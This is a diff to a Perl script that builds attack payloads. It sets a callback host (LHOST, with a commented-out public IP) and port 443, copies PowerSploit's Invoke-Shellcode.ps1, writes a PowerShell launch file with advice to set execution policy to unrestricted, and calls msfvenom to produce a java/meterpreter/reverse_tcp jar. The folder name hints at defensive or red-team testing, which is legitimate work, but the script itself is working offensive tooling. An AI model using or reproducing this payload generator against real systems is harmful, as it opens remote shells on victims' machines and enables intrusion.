@@ -6,8 +6,10 @@ use warnings;
   my($payload, $platform_arch , $commandControl );
   my($currentFileName, $encoder);
 
-  $targetFolder="/opt/local/";
-  $LHOST='169.254.70.157';
+  $targetFolder="/opt/local/malwaredefense";
+  `mkdir -p $targetFolder`;
+  $LHOST='172.24.10.134';
+#  $LHOST='54.83.198.76';
   $LPORT='443'; 
   $IoE="I";#Denote file as intended for internal or external use
   $fileNdx=0;
@@ -33,8 +35,8 @@ use warnings;
 
 
   print "Copy the Invoke-shellcode.ps1 to the target directory\n";
-  my ($ShellCodePath) ="/usr/share/PowerSploit/CodeExecution/Invoke--Shellcode.ps1";
-  `cp $ShellCodePath $targetFolder/Invoke-Shellcode.ps1`;
+  #my ($ShellCodePath) ="/opt/PowerSploit/CodeExecution/Invoke-Shellcode.ps1";
+  #`cp $ShellCodePath $targetFolder/Invoke-Shellcode.ps1`;
 
   print "Creating the ps1 launch file (run set-ExecutionPolicy unrestricted as admin if needed)\n";
   $currentFileName = &getNextFileName();
@@ -47,7 +49,8 @@ use warnings;
 
   print "*** Meterpreter Java  (Paste into Java and compile) \n";
   $currentFileName = &getNextFileName();
-  `msfvenom ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
+  #`msfvenom ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
+  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;
 
 
 
